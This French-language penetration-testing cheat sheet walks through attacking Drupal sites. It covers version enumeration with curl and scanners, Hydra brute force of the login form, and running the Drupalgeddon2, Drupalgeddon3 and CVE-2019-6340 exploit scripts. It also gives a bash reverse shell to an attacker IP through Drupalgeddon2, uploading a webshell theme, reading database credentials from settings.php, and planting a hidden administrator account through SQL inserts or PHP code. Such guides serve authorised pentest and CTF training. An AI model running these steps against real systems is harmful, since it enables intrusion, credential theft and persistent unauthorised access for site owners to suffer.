# Drupal

Drupal est un CMS puissant axé sur la sécurité et la flexibilité, particulièrement utilisé par les institutions gouvernementales et les grandes entreprises.

## 🔍 Énumération

### Identification
```bash
# Vérifier robots.txt
curl -s $URL/robots.txt | grep -i "drupal"

# Rechercher des marqueurs spécifiques
curl -s $URL | grep -i "drupal\|sites/all\|sites/default"

# Vérifier CHANGELOG.txt (souvent disponible)
curl -s $URL/CHANGELOG.txt | head -n 10
```

### Scan avec outils spécifiques
```bash
# Droopescan (outil spécialisé)
droopescan scan drupal --url $URL

# Drupalgeddon2 Scanner
ruby drupalscan.rb $URL

# OWASP CMSmap
cmsmap -F -d $URL
```

### Recherche de version
```bash
# Vérifier dans CHANGELOG.txt
curl -s $URL/CHANGELOG.txt | grep -i "drupal" | head -n 1

# Vérifier d'autres fichiers indicateurs
curl -s $URL/core/install.php | grep -i "drupal.\(version\|core\)"
curl -s $URL/core/COPYRIGHT.txt | grep -i "drupal"

# Vérifier headers
curl -sI $URL | grep -i "x-generator\|x-drupal"
```

## 🔨 Exploitation

### Brute Force d'identifiants
```bash
# Avec Hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt $URL_HOSTNAME http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login_form:Sorry"

# Test avec identifiants par défaut
curl -s -c cookie.txt "$URL/user/login" -d "name=admin&pass=admin&form_id=user_login_form"
```

### Exploits connus (Drupalgeddon)
```bash
# Drupalgeddon2 (CVE-2018-7600) - Affecte Drupal 7.x < 7.58, 8.x < 8.3.9
python drupalgeddon2.py $URL

# Drupalgeddon3 (CVE-2018-7602) - Affecte Drupal < 7.59, < 8.5.3
ruby drupalgeddon3.rb $URL

# Drupal < 8.6.10 / < 8.5.11 (CVE-2019-6340)
python CVE-2019-6340.py $URL
```

### Exploitation de modules vulnérables
```bash
# Vérifier les modules installés
curl -s $URL | grep -o "sites/all/modules/[^/]*" | sort -u

# Services module (RCE via CSRF/SSRF)
# CVE-2020-13671
# https://www.exploit-db.com/exploits/49013
```

## 🔐 Post-exploitation

### Obtention d'un reverse shell
```bash
# Via Drupalgeddon (exemple pour Drupalgeddon2)
# Option dans l'exploit pour obtenir un shell
python drupalgeddon2.py $URL -c "bash -i >& /dev/tcp/VOTRE_IP/4444 0>&1"

# Si vous avez un accès admin:
# 1. Aller dans Appearance > Install new theme
# 2. Uploader un thème malveillant (.zip contenant un webshell)
# 3. Activer le thème
```

### Accès à la base de données
```bash
# Trouver les identifiants dans settings.php
# Pour Drupal 7:
cat sites/default/settings.php | grep -A 20 "database"

# Pour Drupal 8/9:
cat sites/default/settings.php | grep -A 20 "database.*\['default'\]"

# Se connecter à la base
mysql -h $DBHOST -u $DBUSER -p$DBPASS $DBNAME
```

### Création d'un super utilisateur
```bash
# Via SQL (Drupal 7)
INSERT INTO users (uid, name, pass, mail, status) VALUES (1000, 'hacker', '$S$DhC3UjNfRXYdDypHIDJvdj7xU89/D1hFMYhQQxvnYhZ.8ApWB5rz', 'hacker@example.com', 1);
INSERT INTO users_roles (uid, rid) VALUES (1000, 3);

# Via interface admin (modules PHP)
# 1. Activer le module PHP Filter
# 2. Créer du contenu avec PHP:
<?php
$username = 'hacker';
$password = 'password';
$email = 'hacker@example.com';
$new_user = array(
  'name' => $username,
  'pass' => $password,
  'mail' => $email,
  'status' => 1,
  'roles' => array(
    DRUPAL_AUTHENTICATED_RID => 'authenticated user',
    3 => 'administrator',
  ),
);
user_save(NULL, $new_user);
echo "User created!";
?>
```

## ⚠️ Erreurs courantes & astuces
- Drupal stocke sa configuration dans sites/default/settings.php
- Le hash de mot de passe Drupal est particulièrement robuste (algorithm phpass)
- Les versions de modules peuvent être différentes de la version du core
- Drupal peut limiter les tentatives de connexion échouées
- Vérifiez les fichiers de backup (.bak, ~, .old, .swp) dans les répertoires
- Les modules Services et REST API sont des cibles privilégiées